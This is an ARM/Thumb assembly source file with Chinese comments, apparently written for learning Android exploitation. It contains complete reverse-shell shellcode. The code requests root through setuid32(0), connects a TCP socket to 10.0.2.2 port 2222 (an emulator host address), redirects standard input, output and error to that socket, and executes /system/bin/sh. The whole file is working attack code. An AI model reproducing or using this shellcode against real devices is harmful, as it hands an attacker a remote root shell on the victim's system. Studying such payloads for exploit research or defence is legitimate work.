.globl _start
.align 2
_start: @默认入口点
.code 32 @使用ARM指令集
  adr r0, thumb + 1 @最低位置1表示切换到Thumb指令集
  bx r0
thumb:
.code 16 @使用Thumb指令集
  mov r0, #0
  mov r7, #213
  swi #0 @setuid32(0)
  mov r0, #2 @AF_INET
  mov r1, #1 @SOCK_STREAM
  mov r2, #6 @IPPROTO_TCP
  mov r7, #250
  add r7, #31
  swi #0 @int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  mov r4, r0
  adr r1, addr
  mov r2, #16
  mov r7, #250
  add r7, #33
  swi #0 @connect(sock, addr, 16)
  mov r0, r4
  mov r1, #0 @STDIN_FILENO
  mov r7, #63
  swi #0 @dup2(sock, STDIN_FILENO)
  mov r0, r4
  mov r1, #1 @STDOUT_FILENO
  mov r7, #63
  swi #0 @dup2(sock, STDOUT_FILENO)
  mov r0, r4
  mov r1, #2 @STDERR_FILENO
  mov r7, #63
  swi #0 @dup2(sock, STDERR_FILENO)
  adr r0, systembinsh
  mov r1, #0
  push {r1}
  push {r0} @argv[0]
  mov r1, sp @argv
  mov r2, #0
  mov r7, #11
  swi #0 @execve(filename, argv, NULL)
  mov r0, #0
  mov r7, #1
  swi #0 @exit(0)
addr:
  .short 2 @定义16比特数AF_INET
  .ascii "\x08\xAE" @定义2字节port=2222
  .byte 10, 0, 2, 2 @定义4字节ip=10.0.2.2(模拟器中的本机地址)
systembinsh:
  .asciz "/system/bin/sh" @定义字符串filename
